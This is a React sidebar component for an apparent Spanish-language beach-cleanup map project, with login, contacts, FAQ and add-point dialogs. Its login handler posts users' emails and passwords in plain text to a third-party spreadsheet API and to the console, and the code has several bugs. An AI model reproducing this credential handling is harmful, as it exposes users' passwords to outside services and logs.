import React, { useRef } from "react";
import "./Sidebar.css";
import SideNav, {NavItem, NavIcon, NavText } from '@trendmicro/react-sidenav';
import AddIcon from '@mui/icons-material/Add';
import ImportContactsOutlinedIcon from '@mui/icons-material/ImportContactsOutlined';
import HelpOutlineOutlinedIcon from '@mui/icons-material/HelpOutlineOutlined';
import HomeOutlinedIcon from '@mui/icons-material/HomeOutlined';
import '@trendmicro/react-sidenav/dist/react-sidenav.css';
import logo from "../../img/logoRXT.png"
import {Link} from "react-router-dom";
import Button from '@mui/material/Button';
import Dialog from '@mui/material/Dialog';
import DialogActions from '@mui/material/DialogActions';
import DialogContent from '@mui/material/DialogContent';
import DialogContentText from '@mui/material/DialogContentText';
import DialogTitle from '@mui/material/DialogTitle';
import Slide from '@mui/material/Slide';

const URL_LOGIN = "http://localhost/ws-login/login.php"

const enviarData = async (url, data)=> {

const resp = await fetch(url, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/jason'
        }
    });

    console.log(resp);
    const json = await resp.json();
    console.log(json);
}


const Transition = React.forwardRef(function Transition(props, ref) {
    return <Slide direction="up" ref={ref} {...props} />;
  });

export default function Navbar(){

    const refUsuario = useRef(null);
    const refClave = useRef(null);

    const handleLogin=()=> {
        const data = {
            "usuario": refUsuario.current.value,
            "clave": refClave.current.value
        }
        
        fetch('https://sheet.best/api/sheets/d7e4405d-c143-45c4-881b-157eec610464',{
            method:'POST',
            mode: 'cors',
            headers:{
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                "Correo": data.usuario,
                "Contraseña": data.clave
            })
        });
        console.log(data);
        enviarData( URL_LOGIN, data);
        setOpenInicio(false);
        setOpenAñadir(true);
    }

    const [openInicio, setOpenInicio] = React.useState(false);
  
        const handleClickOpenInicio = () => {
          setOpenInicio(true);
        };
  
        const handleCloseInicio = () => {
          setOpenInicio(false);
        };
    const [openTelefonos, setOpenTelefonos] = React.useState(false);
        const handleClickOpenTelefonos = () => {
            setOpenTelefonos(true);
          };
    
          const handleCloseTelefonos = () => {
            setOpenTelefonos(false);
          };
    
    const [openPreguntas, setOpenPreguntas] = React.useState(false);
        const handleClickOpenPreguntas = () => {
            setOpenPreguntas(true);
          };
    
          const handleClosePreguntas = () => {
            setOpenPreguntas(false);
          };

    const [openVolver, setOpenVolver] = React.useState(false);
          const handleClickOpenVolver = () => {
              setOpenVolver(true);
            };
      
            const handleCloseVolver = () => {
              setOpenVolver(false);
            };

    const [openAñadir, setOpenAñadir] = React.useState(false);
        const handleClickOpenAñadir = () => {
              
            };
      
        const handleCloseAñadir = () => {
              setOpenAñadir(false);
            };
    
    return(
        <>
        <SideNav id="Sidebar">
            <SideNav.Toggle/>
                <SideNav.Nav>
                    <NavItem eventKey="añadir-punto">
                        <NavIcon>
                        <div className='centrar-icon' >  <AddIcon/> </div>
                        </NavIcon>
                        <NavText>
                        <p onClick={handleClickOpenInicio}>Ingresar</p> 
                            <Dialog
                                open={openInicio}
                                TransitionComponent={Transition}
                                keepMounted
                                onClose={handleCloseInicio}
                                aria-describedby="alert-dialog-slide-description"
                                id = "formulario"
                                class= "formulario"
                            >
                                <DialogTitle className = "Titulo">{"INICIAR SESIÓN"}</DialogTitle>
                                <DialogContent>
                                   
                                    <input className='login-input'
                                    autoFocus
                                    margin="dense"
                                    id="name"
                                    placeholder="Email Address"
                                    type="email"
                                    fullWidth
                                    variant="standard"
                                    ref={refUsuario}
                                    />
                                    
                                    <input className='login-input'
                                    name="password"
                                    type="password"
                                    placeholder="password"
                                    fullWidth
                                    variant="standard"
                                    ref={refClave}
                                    />
                                </DialogContent>
                                <DialogActions>
                                <Button onClick={handleCloseInicio}>CANCELAR</Button>
                                <Button onClick={handleLogin}>CONTINUAR</Button>
                                </DialogActions>
                            </Dialog>      
                        </NavText>
                    </NavItem>
                    <NavItem eventKey="telefonos">
                        <NavIcon>
                        <div className='centrar-icon' ><ImportContactsOutlinedIcon/></div>
                            <i className="Sidebar-btn-contactanos" style={{ fontSize: '1.75em' }} />
                        </NavIcon>
                        <NavText>
                        <p onClick={handleClickOpenTelefonos}> Telefonos y contactos</p>
                            <Dialog
                                open={openTelefonos}
                                TransitionComponent={Transition}
                                keepMounted
                                onClose={handleCloseTelefonos}
                                aria-describedby="alert-dialog-slide-description"
                            >
                                <DialogTitle className = "Titulo">{"Telefonos y contactos"}</DialogTitle>
                                <DialogContent>
                                    <DialogContentText id="alert-dialog-description">
                                        <p className="Contacto"> Municipo de San Isidro: </p>
                                        <p className="Contacto"> Gobierno de la ciudad de Bs As: </p>
                                        <p className="Contacto"> AMBA: </p>
                                    </DialogContentText>
                                </DialogContent>     
                                <DialogActions>
                                <Button onClick={handleCloseTelefonos}>Ok</Button>
                                </DialogActions>
                            </Dialog>    
                        </NavText>
                    </NavItem>

                    <NavItem eventKey="Preguntas">
                        <NavIcon>
                        <div className='centrar-icon'> <HelpOutlineOutlinedIcon/> </div>
                            <i className="Sidebar-btn" style={{ fontSize: '1.75em' }} />
                        </NavIcon>
                        <NavText>
                        <p onClick={handleClickOpenPreguntas}> Preguntas frecuentes</p>
                            <Dialog
                                open={openPreguntas}
                                TransitionComponent={Transition}
                                keepMounted
                                onClose={handleClosePreguntas}
                                aria-describedby="alert-dialog-slide-description"
                            >
                                <DialogTitle className = "Titulo">{"Preguntas frecuentes sobre el funcionamiento del mapa:"}</DialogTitle>
                                <DialogContent>
                                    <DialogContentText id="alert-dialog-description">
                                        <h4 className="Titulo-pregunta"> ¿Cómo puedo contribuir a la limpieza de las costas? </h4>
                                        <p className="Respuesta"> Hay que tener concincia de lo que consumimos y como lo consumimos. También es importante no dejar residuos en el piso ni en un lugar donde se puedan volar. </p>
                                        <h4 className="Titulo-pregunta"> ¿Cómo se utiliza el mapa? </h4>
                                        <p className="Respuesta"> El uso del mapa es simple. Si presionas un punto, vas a poder ver su localizacion. En la barra de herramientas podrás ingresar un punto, encontrar telefonos útiles o volver al inicio.
                                        Para cualquier otra cualquier consulta: Rexat.proyecto@gmail.com </p>
                                        <h4 className="Titulo-pregunta"> Recomendaciones a la hora de ir a limpiar costas</h4>
                                        <p className="Respuesta"> Recomendamos usar guantes de cocina, botas y ropa cómoda que se pueda ensuciar. Además, es importante llevar 2 bolsas: 1 para separar reciclables y la otra para basura.
                                        <br></br>Para más imfomación respecto a la separación de reciclables y basura: 
                                        <a target = "_blank" rel= "noreferrer" href="https://www.buenosaires.gob.ar/gobierno/basura-vs-reciclable" > https://www.buenosaires.gob.ar/gobierno/basura-vs-reciclable</a> </p>
                                    </DialogContentText>
                                </DialogContent>     
                                <DialogActions>
                                <Button onClick={handleClosePreguntas}>Ok</Button>
                                </DialogActions>
                            </Dialog>   
                        </NavText>
                    </NavItem>

                     <NavItem eventKey="Volver">
                    
                        <NavIcon>
                        <div className='centrar-icon'><HomeOutlinedIcon/></div>
                                <i className="Sidebar-btn-volver" style={{ fontSize: '1.75em' }} />                       
                        </NavIcon>
                        <NavText>
                        <p onClick={handleClickOpenVolver}> Volver</p>
                            <Dialog
                                open={openVolver}
                                TransitionComponent={Transition}
                                keepMounted
                                onClose={handleCloseVolver}
                                aria-describedby="alert-dialog-slide-description"
                            >
                                <DialogTitle className = "Titulo">{"¿Esta seguro que quiere regresar al inicio ?"}</DialogTitle>
                                <DialogActions>
                                
                                <div className= "centrar"> 
                                <div className="Volverbtn"> <Button> <Link to = "/" > Si, quiero regresar. </Link></Button> 
                                <Button onClick={handleCloseVolver}> No, prefiero quedarme.</Button></div></div>
                                
                                </DialogActions>
                            </Dialog>
                        </NavText>                        
                    </NavItem>      

                    <NavItem className="logo-Sidebar">
                        <NavIcon>
                            <img className="logo" src= {logo} alt=" "></img>
                        </NavIcon>
                        <NavText>
                            Rexat.proyecto@gmail.com
                        </NavText>
                    </NavItem>
       
                </SideNav.Nav>   
                             
        </SideNav>

        <div eventKey="Añadir">
                                            
                        <p onClick={handleClickOpenAñadir}> Volver</p>
                            <Dialog
                                open={openAñadir}
                                TransitionComponent={Transition}
                                keepMounted
                                onClose={handleCloseAñadir}
                                aria-describedby="alert-dialog-slide-description"
                            >
                                <DialogTitle className = "Titulo">{"Añadir punto"}</DialogTitle>
                                <DialogContent>
                                   
                                    <input className='Longitud'
                                    autoFocus
                                    margin="dense"
                                    id="name"
                                    placeholder="Longitud"
                                    type="text"
                                    fullWidth
                                    variant="standard"
                                    ref={refUsuario}
                                    />
                                    
                                    <input className='Latitud'
                                    autoFocus
                                    margin="dense"
                                    id="name"
                                    placeholder="Latitud"
                                    type="text"
                                    fullWidth
                                    variant="standard"
                                    ref={refUsuario}
                                    />
                                </DialogContent>
                                <DialogActions>
                                <Button onClick={handleCloseAñadir}>CANCELAR</Button>
                                <Button onClick={handleCloseAñadir}>CONTINUAR</Button>
                                </DialogActions>
                            </Dialog>      
                                  
                                            
                    </div>
    </>
    );
}